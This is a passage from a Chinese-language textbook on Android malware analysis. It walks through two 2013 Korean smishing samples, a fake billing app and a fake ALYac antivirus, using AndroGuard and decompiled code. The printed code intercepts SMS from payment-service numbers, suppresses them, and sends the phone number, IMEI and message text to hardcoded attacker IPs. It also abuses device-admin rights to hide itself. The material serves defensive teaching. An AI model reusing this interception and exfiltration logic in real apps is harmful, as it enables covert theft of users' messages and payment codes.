对内部正在开发而不可公开的程序进行分析时，会有安全隐患，所以使用恶意代码样本进行测试。上传apk文件后几十秒内会出现结果，点击被分析的apk文件名就可以浏览详细的分析内容。

 </div>

详细分析会用smali代码罗列分析结果。从画面右边的“Actions”会看到文件的详细分析内容和图形分析结果。

 </div>

使用图形模式查看时，可以快速确认各调用函数和相关对象、类等的连接信息，所以可用于对恶意代码进行逆向分析，比第3章介绍的APKInspector快捷、灵活。虽然不适合上传并分析自己开发的程序，但分析恶意代码时，便于掌握类和方法函数的调用。

 </div>

#### 4.1.7 使用APK Analyzer进行诊断

很多在线分析服务会着重从用户角度进行分析，但是APK Analyzer（http://apk-analyzer.net）比较适合需要分析Smali代码以查看详细信息的读者。

 </div>

样本分析页面：http://apk-analyzer.net/analysis/465/3438/0/html

在分析页面可以看到, 如果判断有危险就会在顶端使用彩色图标表示危险度, 如图4-48所示。点击 “Show sources” 会看到相关代码的危险原因, 点击左侧链接就能浏览详细的Smali代码。

 </div>

 </div>

本节介绍了使用多种在线服务进行分析的方法。虽然没必要使用所有在线服务，但可根据情况选择。4.2节将介绍不使用这些在线服务而进行手动检测的方法。

### 4.2 手动分析恶意代码 App

本节会使用之前介绍的工具分阶段分析恶意代码。我们会分析几个样本，在分析过程中，每个过程都会使用不同的研究方式。这种分析过程可以使分析者根据自己的环境进行诊断流程的整合。

   </div>

#### 4.2.1 分析smartbling.apk恶意代码（获取设备信息）

2013年的热门话题——“手机钓鱼式攻击”盛行时，我收到的短信内容是查看Outback结算明细。下载的恶意App信息如下。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>项目</td><td style='text-align: center; word-wrap: break-word;'>内容</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MDS:</td><td style='text-align: center; word-wrap: break-word;'>2d6ff3b040feb910f34175cf7ac1ca0b</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SHA-1:</td><td style='text-align: center; word-wrap: break-word;'>97cc713272a4499c5b6b48ef9caa4203d5eacb10</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>File Size:</td><td style='text-align: center; word-wrap: break-word;'>492395 Bytes</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>API Level:</td><td style='text-align: center; word-wrap: break-word;'>android:minSdkVersion 8 android:targetVersion 15</td></tr></table>

参考：API等级信息（http://developer.android.com/guide/topics/manifest/uses-sdk-element.html）

安装smartbilling.apk文件后会出现“mobillians结算”图标，如图4-50所示。运行生成的图标会显示“当前访问人数过多，无法连接。请稍后再试。”的错误信息。

 </div>

#### ☐ 可以下载Android恶意代码的地方

韩国国内很难找到Android恶意代码程序（apk文件）。在韩国发布恶意代码很受限，但本书目的是学习，所以会介绍几个可以下载恶意代码的国外网站。请务必只用于个人学习。

Contagio mobile是一个安全专家（我称为“米拉姐姐”）运营的网站，会第一时间上传各种流行的恶意App，很多韩国专家也会从这里下载恶意代码样本进行分析。这里还同时提供分析网站的链接，所以对学习有很大帮助。

http://contagiominidump.blogspot.kr/

 </div>

VirusShare网站不仅共享Android恶意代码，也会共享很多Windows环境下的恶意代码。使用Torrent和压缩文件形式提供大量恶意代码样本。必须由其他会员推荐才能在网站注册ID。

http://virusshare.com/

 </div>

App文件内有多种图标文件，可以伪装成各种格式的App，如图4-53所示。

 </div>

使用AndroGuard内的androapkinfo.py工具查看smartbilling.apk的API权限，结果如下。标注为dangerous的是可能被恶意使用的权限。包含这种字符的文件不一定全都是恶意代码，要从多种角度分析后自行判断。

#./androapkinfo.py -i /root/Desktop/smartbilling.apk

...省略...

##### PERMISSIONS:

android.permission.RECEIVE_BOOT_COMPLETED ['normal', 'automatically start at boot', 'Allows an application to start itself as soon as the system has finished booting. This can make it take longer to start the phone and allow the application to slow down the overall phone by always running.']

android.permission.READ_PHONE_STATE ['dangerous', 'read phone state and identity', 'Allows the application to access the phone features of the device. An application with this permission can determine the phone number and serial number of this phone, whether a call is active, the number that call is connected to and so on.]

android.permission.ACCESS_NETWORK_STATE ['normal', 'view network status', 'Allows an application to view the status of all networks.']
android.permission.RECEIVE_MMS ['dangerous', 'receive MMS', 'Allows application to receive and process MMS messages. Malicious applications may monitor your messages or delete them without showing them to you.']
android.permission.WAKE_LOCK ['normal', 'prevent phone from sleeping', 'Allows an application to prevent the phone from going to sleep.']
android.permission.RECEIVE_SMS ['dangerous', 'receive SMS', 'Allows application to receive and process SMS messages. Malicious applications may monitor your messages or delete them without showing them to you.']
android.permission.INTERNET ['dangerous', 'full Internet access', 'Allows an application to create network sockets.']
android.permission.WRITE_EXTERNAL_STORAGE ['dangerous', 'modify/delete SD card contents', 'Allows an application to write to the SD card.']

对在androapkinfo.py中查看到的API权限信息整理如下。加粗显示的是可能被恶意使用的API。用户权限（恶意App要求的权限信息）

android.permission.RECEIVE_BOOT_COMPLETED
android.permission.INTERNET
android.permission.ACCESS_NETWORK_STATE
android.permission.RECEIVE_MMS
android.permission.WAKE_LOCK
android.permission.RECEIVE_SMS
android.permission.READ_PHONE_STATE
android.permission.WRITE_EXTERNAL_STORAGE

各权限详细说明如下。有些正常App也会用到这些权限，此时可以通过App特性判断相关App是否必须使用这些权限。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>权限</td><td style='text-align: center; word-wrap: break-word;'>内容</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>android.permission.INTERNET</td><td style='text-align: center; word-wrap: break-word;'>允许程序（App）生成网络套接字</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>android.permission.RECEIVE_MMS</td><td style='text-align: center; word-wrap: break-word;'>允许程序接收并处理MMS信息。此时，恶意App可以监控信息或在用户读取之前就删除信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>android.permission.RECEIVE_SMS</td><td style='text-align: center; word-wrap: break-word;'>允许App接收并处理SMS信息。此时，恶意App可以监控信息或在用户读取之前就删除信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>android.permission.READ_PHONE_STATE</td><td style='text-align: center; word-wrap: break-word;'>允许程序读取手机状态</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>android.permission.WRITE_EXTERNAL_STORAGE</td><td style='text-align: center; word-wrap: break-word;'>允许程序写入外部存储器（提示：如果minSdkVersion和targetSdkVersion值都被设置为3以下，系统则默认向程序赋予此权限）</td></tr></table>

使用androlyze详细查看获得权限的API正在调用哪些方法，结果如下。

检测出了ACCESS_NETWORK_STATE、INTERNET、WAKE_LOCK、READ_PHONE_STATE。

#./androlyze.py -i /root/Desktop/smartbilling.apk -x

PERM : ACCESS_NETWORK_STATE
1 LaI;->run()V (0x1a) ----> Landroid/net/ConnectivityManager;->
getNetworkInfo(I)Landroid/net/NetworkInfo;
1 LaI;->run()V (0x24) ----> Landroid/net/ConnectivityManager;->
getNetworkInfo(I)Landroid/net/NetworkInfo;
1 Lcom/cn/smsclient/CVXAW;->onReceive(Landroid/content/Context;
Landroid/content/Intent;)V (0x11c) ----> Landroid/net/ConnectivityManager;
->getNetworkInfo(I)Landroid/net/NetworkInfo;
1 Lcom/cn/smsclient/CVXAW;->onReceive(Landroid/content/Context;
Landroid/content/Intent;)V (0x124) ----> Landroid/net/ConnectivityManager;
->getNetworkInfo(I)Landroid/net/NetworkInfo;
PERM : INTERNET
1 LaF;->run()V (0xc) ----> Ljava/net/Socket;-><init>(Ljava/lang/String; I)V
1 LaI;->run()V (0x6a) ----> Ljava/net/Socket;-><init>(Ljava/lang/String; I)V
PERM : WAKE_LOCK
1 Lcom/cn/smsclient/MainActivity;->onCreate(Landroid/os/Bundle;)V (0x5c)
----> Landroid/net/wifi/WifiManager$WifiLock;->acquire()V
1 Lcom/cn/smsclient/MainActivity;->onCreate(Landroid/os/Bundle;)V (0x7e)

---> Landroid/os/PowerManager$WakeLock;->acquire()V
1 Lcom/cn/smsclient/MainActivity;->onCreate(Android/os/Bundle;)V (0x76)
---> Landroid/os/PowerManager;->newWakeLock(I Ljava/lang/String;)
Android/os/PowerManager$WakeLock;

PERM : READ_PHONE_STATE
1 LaI;->run()V (0x96) ---->

Android/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;
1 LaI;->run()V (0xe6) ---->

Android/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;
1 Lcom/cn/smsclient/CVXAW;->a(Android/content/Context;)Ljava/lang/String; (0x10)
---> Landroid/telephony/TelephonyManager;->getLine1Number()
Ljava/lang/String;

反编译App文件后浏览源文件，如图4-54所示，执行恶意功能的软件包应该是com.cn.smsclient包。

 </div>

com.cn.smsclient包中存在MainActivity/CVXAW/Ejifndy/OEWRUvcz类文件。

##### MainActivity类的一部分

package com.cn.smsclient;

public class MainActivity extends Activity {
    public static boolean a = true;
    public static boolean b = false;
}

private boolean a(String paramString)
{
    List localList = getPackageManager().getInstalledPackages(8192);
    for (int i = 0; i++)
    {
        if (i >= localList.size())

return false;
if ((PackageInfo)localList.get(i)).packageName.lastIndexOf(
    paramString) > 0)
    return true;
}
}

public void onCreate(Bundle paramBundle)
{
    AlarmManager localAlarmManager =
        (AlarmManager)getSystemService("alarm");
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(this, 0, new Intent(this, Ejifndv.class), 0);
    localAlarmManager.setRepeating(3, SystemClock.elapsedRealtime(), 60000L, localPendingIntent);
    ((WifiManager)getSystemService("wifi").createWifiLock(1, "V3Mobile").acquire();
    ((PowerManager)getSystemService("power").newWakeLock(1, "V3Mobile").acquire();

if (a)
{
    AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
    localBuilder.setMessage("Error Code: [Error] 当前访问人数过多，无法连接。请稍后再试。")
    .TITLE("Error").setCancelable(false).setOnKeyListener
    (new aG(this)).setPositiveButton("查看", new aH(this, this));
    localBuilder.create().show();
}
while (true)
{
    super.onCreate(paramBundle);
    setContentView(2130903040);
    return;
    finish();
}

public boolean onCreateOptionsMenu(Menu paramMenu)
{
    getMenuInflater().inflate(2131165184, paramMenu);
    return true;
}

⑪ 查看是否正常安装smartbilling.apk。

② 关闭屏幕或进入省电模式后，Wi-Fi会断开连接，CPU进入SLEEP状态。为了防止此类事情发生，使用WiFiManager/PaweManager，在屏幕关闭后也使Wi-Fi和CPU保持工作状态。

③ 在满足条件②的前提下运行App，会显示之前看过的Error Code。

CVXAW类的一部分

private static String a(Context paramContext)
{
    return ((TelephonyManager)paramContext.getSystemService("phone").getLine1Number().replace("+82", "0");
}

private static boolean a(String paramString1, String paramString2)
{
    String[] arrayOfString = { "15880184", "16000523", "15990110", "15663355", "15665701", "15880184", "15990110", "15665701", "16001705", "15663357", "16000523", "15663355", "019114", "15997474", "15663357", "15991552", "16008870", "15883810", "16443333", "15448881", "15445553", "16443333", "16008870", "15663355", "15883810", "16001705", "16000523", "16441006", "15771006", "15663357", "0190001813", "01015663355", "16001522", "15885188", "15883610", "15885984", "15885412", "16449999", "15992583", "15885180", "0220093777", "15992583", "16004748", "15663315", "0215663355", "03115663355", "0215663355", "01015663355", "025691146", "01015663355", "15995612", "0000", "15663003", "01240009", "01240012", "114", "15448278", "16001522", "15994006", "027842329", "15995612", "025213560", "025564973", "025564972", "025654192", "025810101", "025213564", "029533353", "15994018", "025524711", "025523874", "07070124301", "023596657", "15884640", "16001522", "025587288", "18994134", "0220338500", "15448278", "15887701", "15773321", "15772111", "025693301", "15445553" };

boolean bool;
if (paramString1 == null)
{
    bool = true;
    return bool;
}

if ((paramString1.length() == 0) ||
(paramString1.equalsIgnoreCase(paramString2)) ||
(paramString1.length() == 6) || (paramString1.length() == 7) ||
(paramString1.length() == 10) ||
(paramString1.length() == 12) || (paramString1.length() == 13) ||
(paramString1.length() == 14)

return true;
if (paramString1.contains("15663355"))
    return true;
if (paramString1.contains("0000"))
    return true;
if (paramString1.contains("012400"))
    return true;
for (int i = 0; i++)
{
    int j = arrayOfString.length;
    bool = false;
    if (i >= j)

break;
if (paramString1.equalsIgnoreCase(arrayOfString[i]))
    return true;
}
} ②

public void onReceive(Context paramContext, Intent paramIntent)
{
    Object[] arrayOfObject;
    SmsMessage[] arrayOfSmsMessage;
    int i;
    if ((paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) || (paramIntent.getAction().equals("android.provider.Telephony.WAP_PUSH_RECEIVED")))
    {
        abortBroadcast();
        Bundle localBundle = paramIntent.getExtras();
        if (localBundle != null)
        {
            arrayOfObject = (Object[])localBundle.get("pdus");
            arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
            i = 0;
            if (i < arrayOfSmsMessage.length)
                break label262;
            if (!a(this.b, a(paramContext)) && (!a(this.c, a(paramContext)))
                break label450;
            String str = new String("To: " + a(paramContext) + " From1: " + this.b + " From2: " + this.c + "\r\nMessage: " + this.d);
            ConnectivityManager localConnectivityManager =
                (ConnectivityManager)paramContext.
                getSystemService("connectivity");
            NetworkInfo localNetworkInfo =
                localConnectivityManager.getNetworkInfo(0);
            NetworkInfo localNetworkInfo2 =
                localConnectivityManager.getNetworkInfo(1);
            int j;
            if (!localNetworkInfo1.isConnected())
                {
                boolean bool = localNetworkInfo2.isConnected();
                j = 0;
                if (!bool);
                }
                else
                {
                    j = 1;
                }
                if ((j != 0) && (!mainActivity.b))
                {
                    this.e.a = str;
                    this.f.start();
                }
            }
        }
    }
}

⑪ 使用Telephonymanager和getLine1Number的Public方法获取电话号码。
②查看监视对象的去电列表和SMS发送列表（15663355(Danal)/0000/00000/012400）。
③ 监视发送的SMS/MMS，保存②中的指定号码发来的SMS/MMS内容。

3 监视发送的SMS/MMS，保存②中的指定号码发来的SMS/MMS内容。

019114: LG Telecom

15880184: Auction

16000523: Mobillians

15990110: 11号街

15663355: Danal

15665701: G Market

15880184: Auction

15990110: 11号街

15665701: G Market

16001705: Mobillians

15663357: Danal

16000523: Mobillians

15663355: Danal

15997474: 11号街图书

15663357: Danal

15991552: SMSTong

16008870: Pmang

15883810: HanGame

16443333: ItemBay

15448881: InfoHub

15445553: InfoHub

16443333: ItemBay

16008870: Pmang

15663355: Danal

15883810: HanGame

16001705: Mobillians

15771006: 首尔信用评价信息

15663357: Danal

15660020: NCSoft

16001522: Nice信用评价信息

15885188: KMS网络

15883610 : 中央日报
15885984 : DaouPay
15885412 : Ppurio客服中心
16449999 : 国民银行
15992583 : ImPay
15885180 : Netmable
15992583 : SK M&C
16004748 : SMSJOA
15663315 : 大阜岛度假村
0220093777 : Munjanara
0190001813 : 无区号

#### AI类的一部分

Socket localSocket = new Socket("126.7.194.82", 2501);
BufferedOutputStream localBufferedOutputStream = new
BufferedOutputStream(localSocket.getOutputStream());
this.b = ((TelephonyManager)this.a.getSystemService("phone").getLine1Number().replace("+82", "0");
this.c = ((TelephonyManager)this.a.getSystemService("phone").getNetworkOperatorName();
this.e = ((TelephonyManager)this.a.getSystemService("phone").getDeviceId();
this.d = (this.b + ",Carrier: " + this.c + ",IMEI: " + this.e);
<p> try </p>

使用Telephonymanager和下面的Public方法获取信息后，会发送到126.7.194.82的2501端口。

☐ 使用getLine1Number获取安装App的手机号码。

☐ 使用getNetworkOperatorName。

☐ 获取DeviceIDMEID或ESN的IMEI的固有设备ID。

获取的IP信息如图4-55所示。分析时，此IP已被屏蔽。

 </div>

 </div>

下面是Anubis在线服务和VirusTotal服务的分析结果。只要有散列值就能在如下网站大致判断是否为恶意代码。

☐ Anubis-Analysis Report:

http://anubis.iseclab.org/?action=result&task_id=12fd8011e9fb3c94409d5bd9f1220da3f&format=html（短链接：http://goo.gl/v9pAzO）

☐ Virustotal-Analysis Report:

https://www.virustotal.com/ko/file/efea243dc7ba2732937873c6a932cc02426502eff19f04c55a124b37718daa17/analysis/（短链接：http://goo.gl/wsibNb）

#### 4.2.2 分析alyac.apk恶意代码（伪造杀毒App）

本节要分析的样本是移动设备上常用的杀毒软件——ALYac，这次也可以访问短链接以使用“钓鱼”短信获取样本代码。这类必须使用的安全类App一定要从正规的Google市场下载安装。

下表记录了下载的恶意App的简要信息。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>项目</td><td style='text-align: center; word-wrap: break-word;'>内容</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MD5:</td><td style='text-align: center; word-wrap: break-word;'>d400c1b9392063fc888cb942c7ecb6ac</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SHA-1:</td><td style='text-align: center; word-wrap: break-word;'>69ab7756949624714b751244f704e7d5573183aa</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>File Size:</td><td style='text-align: center; word-wrap: break-word;'>306923字节</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>API Level:</td><td style='text-align: center; word-wrap: break-word;'>5</td></tr></table>

这次的“钓鱼”短信使用下列短链接进行传播。因为用户不能立即确认这种短链接是否正常，所以经常会去点击。

 </div>

安装恶意App后会生成ALYac杀毒软件图标。点击图标时会要求激活设备管理员，如图4-58所示。

 </div>

   </div>

允许激活设备管理员后，App图标会被隐藏。虽然图标已消失，但是程序仍安装在设备中。

 </div>

使用androapkinfo.py工具查看API权限时，显示如下信息。与第一个样本源代码相同，使用dangerous字符显示可能被恶意使用的API。

#./androapkinfo.py -i /root/Desktop/alyac.apk

省略...

PERMISSIONS:

android.permission.ACCESS_FINE_LOCATION ['dangerous', 'fine (GPS) location', 'Access fine location sources, such as the Global Positioning System on the phone, where available. Malicious applications can use this to determine where you are and may consume additional battery power.']

android.permission.SEND_SMS ['dangerous', 'send SMS messages', 'Allows application to send SMS messages. Malicious applications may cost you money by sending messages without your confirmation.']

android.permission.RECEIVE_BOOT_COMPLETED ['normal', 'automatically start at boot', 'Allows an application to start itself as soon as the system has finished booting. This can make it take longer to start the phone and allow the application to slow down the overall phone by always running.']

android.permission.INTERNET ['dangerous', 'full Internet access', 'Allows an application to create network sockets.']

android.permission.ACCESS_MOCK_LOCATION ['dangerous', 'mock location sources for testing', 'Create mock location sources for testing. Malicious applications can use this to override the location and/or status returned by real-location sources such as GPS or Network providers.']

android.permission.VIBRATE ['normal', 'control vibrator', 'Allows the application to control the vibrator.']

android.permission.CAMERA ['dangerous', 'take pictures and videos', 'Allows application to take pictures and videos with the camera. This allows the application to collect images that the camera is seeing at any time.']

android.permission.ACCESS_NETWORK_STATE ['normal', 'view network status', 'Allows an application to view the status of all networks.']
android.permission.ACCESS_COARSE_LOCATION ['dangerous', 'coarse (network-based) location', 'Access coarse location sources, such as the mobile network database, to determine an approximate phone location, where available. Malicious applications can use this to determine approximately where you are.']
android.permission.WAKE_LOCK ['normal', 'prevent phone from sleeping', 'Allows an application to prevent the phone from going to sleep.']
android.permission.RECEIVE_SMS ['dangerous', 'receive SMS', 'Allows application to receive and process SMS messages. Malicious applications may monitor your messages or delete them without showing them to you.']
android.permission.READ_PHONE_STATE ['dangerous', 'read phone state and identity', 'Allows the application to access the phone features of the device. An application with this permission can determine the phone number and serial number of this phone, whether a call is active, the number that call is connected to and so on.']
android.permission.RECORD_AUDIO ['dangerous', 'record audio', 'Allows application to access the audio record path.']
android.permission.MOUNT_UNMOUNT_FILESYSTEMS ['signatureOrSystem', 'mount and unmount file systems', 'Allows the application to mount and unmount file systems for removable storage.']
android.permission.WRITE_EXTERNAL_STORAGE ['dangerous', 'modify/ delete SD card contents', 'Allows an application to write to the SD card.']
android.permission.FLASHLIGHT ['normal', 'control flashlight', 'Allows the application to control the flashlight.']

省略...

使用androapkinfo.py整理查看后的API信息，结果如下。加粗显示的是可能被恶意使用的API。用户权限（恶意代码要求的权限信息）

android.permission.RECEIVE_SMS
android.permission.ACCESS_NETWORK_STATE
android.permission.RECEIVE_BOOT_COMPLETED
android.permission.READ_PHONE_STATE
android.permission.INTERNET
android.permission.SEND_SMS
android.permission.ACCESS_FINE_LOCATION
android.permission.ACCESS_COARSE_LOCATION
android.permission.ACCESS_MOCK_LOCATION
android.permission.WRITE_EXTERNAL_STORAGE
android.permission.VIBRATE
android.permission.FLASHLIGHT
android.permission.READ_PHONE_STATE
android.permission.ACCESS_NETWORK_STATE
android.permission.MOUNT_UNMOUNT_FILESYSTEMS
android.permission.CAMERA
android.permission.WAKE_LOCK
android.permission.RECORD_AUDIO

使用androlyze详细查看获得权限的API正在调用哪些方法,结果检测出了CHANGE_COMPONENT_ENABLED_STATE/READ_PHONE_STATE/ACCESS_NETWORK_STATE/INTERNET。

##### #./androlyze.py -i /root/Desktop/alyac.apk -x

##### PERM : CHANGE_COMPONENT_ENABLED_STATE

1 Lkorean/alyac/view/AgreeActivity;->moveMainActivity()V (0x14) ---->
Android/content/pm/PackageManager;->setComponentEnabledSetting(Android/content/ComponentName; I I)V
1 Lkorean/alyac/view/MainActivity;->doAutoTimeScan()V (0x2c) ---->
Android/content/pm/PackageManager;->setComponentEnabledSetting(Android/content/ComponentName; I I)V

##### PERM : READ_PHONE_STATE

1 Lkorean/alyac/view/SMSBroadcastReceiver;->
getPhoneNumber(Android/content/Context;)Ljava/lang/String; (0x10) --->
Android/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;
1 Lkorean/alyac/view/SMSBroadcastReceiver;->
getdevicesid(Android/content/Context;)Ljava/lang/String; (0x12) --->
Android/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;
1 Lkorean/alyac/view/StartActivity;->run()V (0x1e) --->
Android/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

##### PERM : ACCESS_NETWORK_STATE

1 Lkorean/alyac/net/HttpUtils;->detect(Android/content/Context;)Z (0x20)
---> Android/net/ConnectivityManager;->getActiveNetworkInfo()
Android/net/NetworkInfo;
1 Lkorean/alyac/view/MainActivity;->detect(Android/app/Activity;)Z (0x20)
---> Android/net/ConnectivityManager;->getActiveNetworkInfo()
Android/net/NetworkInfo;

##### PERM : INTERNET

1 Lkorean/alyac/net/HttpUtils;->
uileClient()Lorg/apache/http/impl/client/DefaultHttpClient; (0x24) ---->
Lorg/apache/http/impl/client/DefaultHttpClient;-><init>(Lorg/apache/http/params/HttpParams;)V
1 Lkorean/alyac/net/HttpUtils;->
equestData(Ljava/lang/String;)Ljava/lang/String; (0x14) ---->
Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
1 Lkorean/alyac/net/HttpUtils;->
equestData2(Ljava/lang/String;)Ljava/lang/String; (0x12) ---->
Ljava/net/URL;->openConnection()
Ljava/net/URLConnection;
1 Lkorean/alyac/view/SMSBroadcastReceiver;->
endPOSTRequest(Ljava/lang/String; Ljava/util/Map; Ljava/lang/String;)Z
(0x64) ----> Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
1 Lkorean/alyac/net/HttpUtils;->
equestData2(Ljava/lang/String;)Ljava/lang/String; (0x48) ---->
Ljava/net/HttpURLConnection;->connect()V

图4-60是恶意App和正常App的源代码结构。恶意App没有加密，但正常App已加密，类都被替换为特定字符串，提高了分析的难度。攻击者可能解密正常程序后修改了源代码，并重新进行了编译。

 </div>

在部分源代码中找出AgreeActivity类后，可以看到要求激活设备管理员。

public class AgreeActivity extends Activity
  implements View.OnClickListener
{
    static DevicePolicyManager mPolicyManager;
    private ComponentName mDeviceAdmin;

    private void moveMainActivity()
    {
        getPackageManager().setComponentEnabledSetting(getComponentName(),
                                  2, 1);
        this.mDeviceAdmin = new ComponentName(this, Device_Admin.class);
        mPolicyManager =
                (DevicePolicyManager)getSystemService("device_policy");
        enableAdmin();
        startActivity(new Intent(this, StartActivity.class));
        finish();
    }

    public void desableAdmin()
    {

mPolicyManager.removeActiveAdmin(this.mDeviceAdmin);
}

public void enableAdmin()
{
    Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
    localIntent.putExtra("android.app.extra.DEVICE_ADMIN",
                                  this.mDeviceAdmin);
    localIntent.putExtra("android.app.extra.ADD_EXPLANATION",
                                  为了保护设备并保持App的正常运行，请选择如下设置。");
    startActivityForResult(localIntent, 1);
}

SMSBroadcastReceiver类会使用getLine1Number()和getdevicesid()获取手机号码和设备ID（DevicesID）。

private String getPhoneNumber(Context paramContext)
{
    return ((TelephonyManager)paramContext.getSystemService("phone").getLine1Number();
}

省略...

public String getdevicesid(Context paramContext)
{
    TelephonyManager localTelephonyManager =
        (TelephonyManager)paramContext.getSystemService("phone");
    try
    {
        String str = localTelephonyManager.getDeviceId();
        return str;
    }
    catch (Exception localException)
    {
        return null;
    }
}

...省略...

查看SMS信息后，将SMS去电号码/SMS信息内容/日期、时间等信息与之前获取的手机号码和设备ID一起发送到http://61.198.220.16。

public void onReceive(Context paramContext, Intent paramIntent)
{
    if (!paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
        return;
        this.util = new HttpUtils();
        String str1 = getPhoneNumber(paramContext);
        String str2 = getdevicesid(paramContext);
        if (TextUtils.isEmpty(str1))
        {
            return;
        }
        return;
    }
}

this.weiyi = str2;
while (true)
{
    if (TextUtils.isEmpty(this.weiyi))
        this.weiyi = "";
    Object[] arrayOfObject =
        (Object[])paramIntent.getExtras().get("pdus");
    int i = arrayOfObject.length;
    int j = 0;
    label88: if (j >= i)
    break;
    SmsMessage localSmsMessage =
        SmsMessage.createFromPdu((byte[])arrayOfObject[j]);
    String str3 = localSmsMessage.getOriginatingAddress();
    String str4 = localSmsMessage.getMessageBody();
    Date localDate = new Date(localSmsMessage.getTimestampMillis());
    new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(localDate);
    try
    {
        if ((HttpUtils.detect(paramContext)) && (str3 != null) &&
                                           ("".equals(str3)) && (str1 != null) && (!"".equals(str1)))
                                           ("".equals(str5 = URLEncoder.encode(str4, "UTF-8");
                                           this.url = ("http://61.198.220.16/" + "phone=" + this.weiyi +
                                           "&send=" + str3 + "&surak=" + this.weiyi + "&memo=" + str5 + "&type=memo&xcode=1");
                                           HttpUtils.requestData2(this.url);
                                           this.url = ("http://61.198.220.16/" + "check.php?phone=" +
                                           this.weiyi);
                                           if (!HttpUtils.requestData2(this.url).equals("219083"))
                                                         abortBroadcast();
                                             j++;
                                             break label88;
                                             this.weiyi = str1;
                                             }
                                             catch (Exception localException)
                                                         {
                                                         while (true)
                                                             localException.printStackTrace();
                                             }
            }

恶意App不是一次性的，如果不删除就会一直在后台运行。使用小额结算时，相关信息会一直发送给http://61.198.220.16。已查看的IP信息如图4-61所示，此IP已被屏蔽。

 </div>

VirusTotal上注册的46个杀毒引擎都未在2013年4月21日探测出该恶意App。之后又发现了变种，下面分析变种程序的内容。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>项目</td><td style='text-align: center; word-wrap: break-word;'>内容</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MD5:</td><td style='text-align: center; word-wrap: break-word;'>eb8f44b005a9dfa2a0262609a4c0509f</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SHA-1:</td><td style='text-align: center; word-wrap: break-word;'>b97f911e3f266617c2ecd32ef1561f42affd275d</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>File Size:</td><td style='text-align: center; word-wrap: break-word;'>305326字节</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>API Level:</td><td style='text-align: center; word-wrap: break-word;'>5</td></tr></table>

 </div>

安装恶意代码后的运行模式与之前伪装成ALYac杀毒软件的程序相同。使用androapinfo.py查看API要求的权限，结果如下。

##### PERMISSIONS:

android.permission.ACCESS_FINE_LOCATION ['dangerous', 'fine (GPS) location', 'Access fine location sources, such as the Global Positioning System on the phone, where available. Malicious applications can use this to determine where you are and may consume additional battery power.']

android.permission.SEND_SMS ['dangerous', 'send SMS messages', 'Allows application to send SMS messages. Malicious applications may cost you money by sending messages without your confirmation.']

android.permission.RECEIVE_BOOT_COMPLETED ['normal', 'automatically start at boot', 'Allows an application to start itself as soon as the system has finished booting. This can make it take longer to start the phone and allow the application to slow down the overall phone by always running.']

android.permission.INTERNET ['dangerous', 'full Internet access', 'Allows an application to create network sockets.']

android.permission.ACCESS_MOCK_LOCATION ['dangerous', 'mock location sources for testing', 'Create mock location sources for testing. Malicious applications can use this to override the location and/or status returned by real-location sources such as GPS or Network providers.']

android.permission.VIBRATE ['normal', 'control vibrator', 'Allows the application to control the vibrator.']

android.permission.CAMERA ['dangerous', 'take pictures and videos', 'Allows application to take pictures and videos with the camera. This allows the application to collect images that the camera is seeing at any time.']

android.permission.PROCESS_OUTGOING_CALLS ['dangerous', 'intercept outgoing calls', 'Allows application to process outgoing calls and change the number to be dialled. Malicious applications may monitor, redirect or prevent outgoing calls.']

android.permission.ACCESS_NETWORK_STATE ['normal', 'view network status', 'Allows an application to view the status of all networks.']

android.permission.ACCESS_COARSE_LOCATION ['dangerous', 'coarse (network-based) location', 'Access coarse location sources, such as the mobile network database, to determine an approximate phone location, where available. Malicious applications can use this to determine approximately where you are.']

android.permission.WAKE_LOCK ['normal', 'prevent phone from sleeping', 'Allows an application to prevent the phone from going to sleep.']

android.permission.CALL_PHONE ['dangerous', 'directly call phone numbers', 'Allows an application to initiate a phone call without going through the Dialer user interface for the user to confirm the call being placed.']

android.permission.FLASHLIGHT ['normal', 'control flashlight', 'Allows the application to control the flashlight.']
android.permission.RECEIVE_SMS ['dangerous', 'receive SMS', 'Allows application to receive and process SMS messages. Malicious applications may monitor your messages or delete them without showing them to you.']
android.permission.READ_PHONE_STATE ['dangerous', 'read phone state and identity', 'Allows the application to access the phone features of the device. An application with this permission can determine the phone number and serial number of this phone, whether a call is active, the number that call is connected to and so on.']
android.permission.MOUNT_UNMOUNT_FILESYSTEMS ['signatureOrSystem', 'mount and unmount file systems', 'Allows the application to mount and unmount file systems for removable storage.']
